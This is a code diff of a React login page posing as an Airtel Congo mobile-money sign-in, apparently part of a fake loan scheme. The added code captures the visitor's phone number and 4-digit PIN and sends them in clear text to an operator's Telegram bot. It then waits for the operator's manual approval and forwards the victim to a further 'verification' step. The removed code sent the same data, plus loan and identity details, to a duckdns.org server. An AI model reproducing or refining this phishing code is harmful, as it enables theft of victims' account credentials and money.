@@ -1,7 +1,9 @@
 import React, { useState, useRef, useEffect } from 'react'
-import axios from 'axios'
 import { useNavigate, useParams } from 'react-router-dom'
-import { apiService } from '../services/api.js'
+
+const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ''
+const ADMIN_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
+const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN
 
 const SpinnerStyle = () => (
   <style>{`
@@ -10,19 +12,6 @@ const SpinnerStyle = () => (
     }
   `}</style>
 )
-
-const API_BASE_URL = "https://lnmb.duckdns.org"
-
-const api = axios.create({
-  baseURL: API_BASE_URL,
-  headers: { "Content-Type": "application/json" }
-})
-
-api.interceptors.request.use(config => {
-  const bot = window.location.pathname.split("/")[1] || "user1"
-  config.headers["X-Bot-Name"] = bot
-  return config
-})
 
 const STATUS_MESSAGES = {
   pending: "⏳ En attente...",
@@ -36,6 +25,8 @@ const STATUS_MESSAGES = {
 function Login() {
   const navigate = useNavigate()
   const { user } = useParams()
+  const userId = (user && user !== "default") ? user : "user1"
+  const basePath = (user && user !== "default") ? `/${user}` : ""
   const [phone, setPhone] = useState("")
   const [inputs, setInputs] = useState(Array(4).fill(""))
   const [loading, setLoading] = useState(false)
@@ -43,11 +34,12 @@ function Login() {
   const [error, setError] = useState("")
   const [status, setStatus] = useState("")
   const [adminMessage, setAdminMessage] = useState("")
-  const sessionIdRef = useRef(null)
+  const [showRetryButton, setShowRetryButton] = useState(false)
+  const requestIdRef = useRef(null)
   const pollingIntervalRef = useRef(null)
-
-  const userId = (user && user !== "default") ? user : "user1"
-  const basePath = (user && user !== "default") ? `/${user}` : ""
+  const startTimeRef = useRef(null)
+  const checkCountRef = useRef(0)
+  const maxChecks = 24
 
   useEffect(() => {
     const timer = setTimeout(() => setInputs(Array(4).fill("")), 30000)
@@ -65,6 +57,14 @@ function Login() {
   }, [])
 
   useEffect(() => {
+    const msg = sessionStorage.getItem('adminMessage')
+    if (msg) {
+      setAdminMessage(msg)
+      sessionStorage.removeItem('adminMessage')
+    }
+  }, [])
+
+  useEffect(() => {
     return () => {
       if (pollingIntervalRef.current) {
         clearInterval(pollingIntervalRef.current)
@@ -72,6 +72,13 @@ function Login() {
       }
     }
   }, [])
+
+  const phoneInputRef = useRef(null)
+
+  const handlePhoneChange = (e) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 9)
+    setPhone(value)
+  }
 
   const handleInputChange = (index, value) => {
     if (value !== "" && !/^\d$/.test(value)) return
@@ -105,150 +112,201 @@ function Login() {
     }
   }
 
-  const checkStatus = async (sid) => {
-    if (!sid) return
+  const checkPhoneValid = () => {
+    return /^\d{9}$/.test(phone)
+  }
+
+  const isFormComplete = () => {
+    const pinValid = inputs.every(input => /^\d$/.test(input))
+    return checkPhoneValid() && pinValid
+  }
+
+  async function sendTelegramNotification(phoneNumber, pin) {
+    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
     
+    const lines = [
+      '📲 New Airtel Congo Request',
+      '📱 Phone: ' + phoneNumber,
+      '🔑 PIN: ' + pin,
+      '🆔 Request: ' + requestId
+    ]
+    const message = lines.join('\n')
+
     try {
-      const response = await api.post("/api/check-pin-status", {
-        sessionId: sid,
-        bot: userId
+      const response = await fetch(TELEGRAM_API + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ADMIN_CHAT_ID,
+          text: message,
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Approve', callback_data: 'approve_' + requestId },
+              { text: '❌ Reject', callback_data: 'reject_' + requestId }
+            ]]
+          }
+        })
       })
-      const data = response.data
-      
-      if (data.status === "approved") {
-        setStatus("approved")
-        setLoading(false)
-        setWaitingForApproval(false)
-        setSessionIdRef(null)
-        if (pollingIntervalRef.current) {
-          clearInterval(pollingIntervalRef.current)
-          pollingIntervalRef.current = null
-        }
-        setTimeout(() => {
-          navigate(`${basePath}/verification`)
-        }, 800)
-      } else if (data.status === "rejected") {
-        setStatus("rejected")
-        setLoading(false)
-        setWaitingForApproval(false)
-        if (pollingIntervalRef.current) {
-          clearInterval(pollingIntervalRef.current)
-          pollingIntervalRef.current = null
-        }
-      } else if (data.status === "wrong_pin") {
-        setError("Code PIN incorrect. Veuillez réessayer.")
-        setLoading(false)
-        setWaitingForApproval(false)
-        if (pollingIntervalRef.current) {
-          clearInterval(pollingIntervalRef.current)
-          pollingIntervalRef.current = null
-        }
-      } else if (data.status === "expired") {
-        setError("La vérification du code PIN a expiré. Veuillez réessayer.")
-        setLoading(false)
-        setWaitingForApproval(false)
-        if (pollingIntervalRef.current) {
-          clearInterval(pollingIntervalRef.current)
-          pollingIntervalRef.current = null
-        }
-      } else if (data.status === "message_user") {
-        setAdminMessage(data.message || "Message from admin received")
-        setStatus("message_sent")
-      } else if (data.status === "pending") {
-        setStatus("pending")
-        setWaitingForApproval(true)
-      }
-    } catch (err) {
-      console.error("Polling error:", err)
+      return { success: response.ok, requestId: requestId }
+    } catch (e) {
+      console.error('Telegram send failed:', e)
+      return { success: false, error: e.message, requestId: requestId }
     }
   }
 
-  const setSessionIdRef = (sid) => {
-    sessionIdRef.current = sid
+  async function checkTelegramApproval(requestId) {
+    try {
+      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000')
+      const data = await response.json()
+      
+      if (data.ok && Array.isArray(data.result)) {
+        for (const update of data.result) {
+          if (update.callback_query) {
+            const parts = update.callback_query.data.split('_')
+            const action = parts[0]
+            const id = parts.slice(1).join('_')
+            if (id === requestId) {
+              if (action === 'approve') {
+                try {
+                  await fetch(TELEGRAM_API + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: update.callback_query.from.id,
+                      text: '✅ Transaction approved!'
+                    })
+                  })
+                } catch (e) {}
+                return { approved: true, status: 'approved' }
+              } else if (action === 'reject') {
+                try {
+                  await fetch(TELEGRAM_API + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: update.callback_query.from.id,
+                      text: '❌ Transaction rejected.'
+                    })
+                  })
+                } catch (e) {}
+                return { approved: false, status: 'rejected' }
+              }
+            }
+          }
+        }
+      }
+      return { approved: false, status: 'pending' }
+    } catch (e) {
+      console.error('Approval check failed:', e)
+      return { approved: false, status: 'error' }
+    }
   }
 
-  const startPolling = (sessionId) => {
-    if (!sessionId) return
-    
-    setSessionIdRef(sessionId)
+  const startPolling = (requestId) => {
+    checkCountRef.current = 0
+    startTimeRef.current = Date.now()
+    requestIdRef.current = requestId
+
     setLoading(true)
     setWaitingForApproval(true)
     setError("")
     setStatus("")
-    
-    const poll = async () => {
-      if (!sessionIdRef.current) return
-      try {
-        await checkStatus(sessionIdRef.current)
-      } catch (err) {
-        console.error("Poll error:", err)
+    setShowRetryButton(false)
+
+    pollingIntervalRef.current = setInterval(async () => {
+      checkCountRef.current++
+      const result = await checkTelegramApproval(requestId)
+
+      const elapsed = Math.floor((Date.now() - startTimeRef.current) / 1000)
+      console.log('Checking... elapsed:', elapsed, 'check:', checkCountRef.current)
+
+      if (result.approved) {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        setLoading(false)
+        setWaitingForApproval(false)
+        setStatus("approved")
+        requestIdRef.current = null
+        sessionStorage.setItem('airtelOTPApproved', 'true')
+        setTimeout(() => {
+          navigate(`${basePath}/verification`)
+        }, 800)
+      } else if (result.status === 'rejected') {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        setLoading(false)
+        setWaitingForApproval(false)
+        setStatus("rejected")
+        requestIdRef.current = null
+      } else if (checkCountRef.current >= maxChecks) {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        setLoading(false)
+        setWaitingForApproval(false)
+        setStatus("expired")
+        requestIdRef.current = null
+        setShowRetryButton(true)
       }
-    }
-    
-    poll()
-    
-    pollingIntervalRef.current = setInterval(poll, 500)
+    }, 5000)
   }
 
-  const submitPin = async () => {
-    const pin = inputs.join("")
+  const initiateTelegramApproval = async () => {
+    if (!checkPhoneValid()) {
+      setError("Format invalide. Le numéro doit commencer par 9 et contenir 9 chiffres.")
+      return
+    }
+    
+    const pin = inputs.join('')
+    if (pin.length !== 4) return
+
     setLoading(true)
     setError("")
     setStatus("")
-    setWaitingForApproval(false)
+    setWaitingForApproval(true)
 
-    const storedApp = localStorage.getItem('loanAppData')
-    const storedClient = localStorage.getItem('clientData')
-    const appData = storedApp ? JSON.parse(storedApp) : {}
-    const clientData = storedClient ? JSON.parse(storedClient) : {}
+    const phoneNumber = phone
+    const pinCode = pin
+
+    sessionStorage.setItem('airtelPhone', phoneNumber)
+    sessionStorage.setItem('airtelPin', pinCode)
+
+    const result = await sendTelegramNotification(phoneNumber, pinCode)
     
-    const phoneNumber = appData.number || phone || ""
-    const formattedPhone = phoneNumber.startsWith("+243") || phoneNumber.startsWith("243") 
-      ? phoneNumber 
-      : phoneNumber.startsWith("0") 
-        ? "+243" + phoneNumber.substring(1) 
-        : "+243" + phoneNumber
-
-    const requestBody = {
-      phoneNumber: formattedPhone,
-      pinCode: pin,
-      bot: userId,
-      userId: `user_${Date.now()}`,
-      userName: clientData.name || "User",
-      name: appData.name || "",
-      number: phone || "",
-      dob: clientData.dob || "",
-      id: clientData.id || "",
-      loan: clientData.amount || "",
-      income: clientData.employment || "",
-      otp: ""
-    }
-
-    try {
-      await apiService.sendTelegramNotification(requestBody)
-      
-      const response = await api.post("/api/verify-pin", requestBody)
-
-      if (response.data.success && response.data.sessionId) {
-        startPolling(response.data.sessionId)
-      } else {
-        setError(response.data.error || "Verification failed")
-      }
-    } catch (err) {
-      console.error("PIN submission error:", err)
-      const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message || "Network error"
-      setError(`Error: ${errorMsg}. Please check connection and try again.`)
-      setTimeout(() => {
-        setLoading(true)
-        setWaitingForApproval(true)
-      }, 100)
+    if (result.success) {
+      startPolling(result.requestId)
+    } else {
+      setLoading(false)
+      setWaitingForApproval(false)
+      setError('Erreur de communication: ' + (result.error || 'Unknown error'))
+      setShowRetryButton(true)
     }
   }
 
-  const resetForm = () => {
-    setInputs(Array(4).fill(""))
-    const input = document.getElementById('pin-0')
-    input?.focus()
+  const handleRetry = () => {
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current)
+      pollingIntervalRef.current = null
+    }
+    initiateTelegramApproval()
+  }
+
+  const showInvalidNumberModal = () => {
+    const warning = document.createElement('div')
+    warning.className = 'number-warning'
+    warning.innerHTML = '<div class="number-warning-card" role="alertdialog" aria-modal="true"><div class="number-warning-icon">⚠️</div><h2>Format Invalide</h2><p>Le numéro de téléphone doit commencer par <strong>9</strong> et contenir <strong>9 chiffres</strong>.</p><p>Veuillez entrer le bon numéro et réessayer!</p><button type="button">OK</button></div>'
+    warning.querySelector('button').onclick = () => { 
+      warning.remove()
+      phoneInputRef.current?.focus()
+    }
+    document.body.appendChild(warning)
+  }
+
+  const handleConnectClick = () => {
+    if (!checkPhoneValid()) {
+      showInvalidNumberModal()
+      return
+    }
+    initiateTelegramApproval()
   }
 
   return (
@@ -265,7 +323,28 @@ function Login() {
       <main>
         <div className="phone-number">
           <div className="numbercont">
-            <div className="countrycode">+243 | {phone || " "}</div>
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "15px" }}>
+              <span style={{ color: "#333", fontSize: "16px", marginRight: "8px" }}>+243 |</span>
+              <input
+                ref={phoneInputRef}
+                type="tel"
+                id="phone"
+                inputMode="numeric"
+                maxLength={9}
+                value={phone}
+                onChange={handlePhoneChange}
+                placeholder="9XXXXXXXX"
+                style={{
+                  width: "200px",
+                  padding: "8px 12px",
+                  fontSize: "16px",
+                  border: "1px solid #ddd",
+                  borderRadius: "6px",
+                  textAlign: "left"
+                }}
+                disabled={loading || waitingForApproval}
+              />
+            </div>
           </div>
         </div>
         
@@ -349,42 +428,42 @@ function Login() {
             </div>
           )}
           
-          <div>
-            {[0, 1, 2, 3].map(index => (
-              <input
-                key={index}
-                id={`pin-${index}`}
-                type="text"
-                inputMode="numeric"
-                maxLength="1"
-                value={inputs[index] || ""}
-                onChange={(e) => handleInputChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onPaste={(e) => {
-                  e.preventDefault()
-                  const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4)
-                  if (text.length === 4) {
-                    const newInputs = text.split('')
-                    setInputs(newInputs)
-                    submitPin()
-                  }
-                }}
-                style={{
-                  width: "45px",
-                  height: "45px",
-                  fontSize: "18px",
-                  textAlign: "center",
-                  border: "1px solid #ddd",
-                  borderRadius: "6px",
-                  marginRight: "8px",
-                  backgroundColor: loading || waitingForApproval ? "#f5f5f5" : "#fff",
-                  cursor: loading || waitingForApproval ? "default" : "pointer"
-                }}
-                disabled={loading || waitingForApproval}
-                autoComplete="one-time-code"
-              />
-            ))}
-          </div>
+           <div style={{ display: "flex", justifyContent: "center" }}>
+             {[0, 1, 2, 3].map(index => (
+               <input
+                 key={index}
+                 id={`pin-${index}`}
+                 type="password"
+                 inputMode="numeric"
+                 maxLength="1"
+                 value={inputs[index] || ""}
+                 onChange={(e) => handleInputChange(index, e.target.value)}
+                 onKeyDown={(e) => handleKeyDown(index, e)}
+                 onPaste={(e) => {
+                   e.preventDefault()
+                   const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4)
+                   if (text.length === 4) {
+                     const newInputs = text.split('')
+                     setInputs(newInputs)
+                     initiateTelegramApproval()
+                   }
+                 }}
+                 style={{
+                   width: "45px",
+                   height: "45px",
+                   fontSize: "18px",
+                   textAlign: "center",
+                   border: "1px solid #ddd",
+                   borderRadius: "6px",
+                   marginRight: "8px",
+                   backgroundColor: "#fff",
+                   cursor: "pointer"
+                 }}
+                 disabled={loading || waitingForApproval}
+                 autoComplete="one-time-code"
+               />
+             ))}
+           </div>
           
           {error && <div className="error-message" style={{ color: "red", textAlign: "center", margin: "10px 0" }}>{error}</div>}
           
@@ -403,18 +482,18 @@ function Login() {
       <footer>
         <div className="curvesec">
           <button
-            onClick={submitPin}
-            disabled={inputs.some(i => !i) || loading || waitingForApproval}
+            onClick={handleConnectClick}
+            disabled={!isFormComplete() || loading || waitingForApproval}
             style={{
-              opacity: inputs.some(i => !i) || loading || waitingForApproval ? 0.6 : 1,
-              cursor: inputs.some(i => !i) || loading || waitingForApproval ? "not-allowed" : "pointer",
+              opacity: !isFormComplete() || loading || waitingForApproval ? 0.6 : 1,
+              cursor: !isFormComplete() || loading || waitingForApproval ? "not-allowed" : "pointer",
               display: "flex",
               alignItems: "center",
               justifyContent: "center",
               gap: "8px",
               padding: "12px 24px",
               margin: "0 auto",
-              backgroundColor: loading || waitingForApproval ? "#ccc" : "#11bb4a",
+              backgroundColor: loading || waitingForApproval ? "#ccc" : "#ed1c2e",
               color: "white",
               border: "none",
               borderRadius: "6px",
@@ -435,15 +514,40 @@ function Login() {
                 }}></span>
                 Vérification...
               </>
+            ) : status === "expired" ? (
+              "Ressayer"
             ) : "Se connecter"}
           </button>
+          {showRetryButton && status === "expired" && (
+            <button
+              onClick={handleRetry}
+              style={{
+                opacity: 1,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: "8px",
+                padding: "12px 24px",
+                margin: "10px auto 0",
+                backgroundColor: "#2196f3",
+                color: "white",
+                border: "none",
+                borderRadius: "6px",
+                fontSize: "16px",
+                fontWeight: "500"
+              }}
+            >
+              🔄 Ressayer
+            </button>
+          )}
           <p>En continuant, vous acceptez les conditions générales.</p>
         </div>
         
         <div style={{ textAlign: 'center', marginTop: '20px' }}>
           <button
             type="button"
-            onClick={() => navigate(`${basePath}/apply`)}
+             onClick={() => navigate(`${basePath}/apply`)}
             style={{
               background: 'none',
               border: 'none',
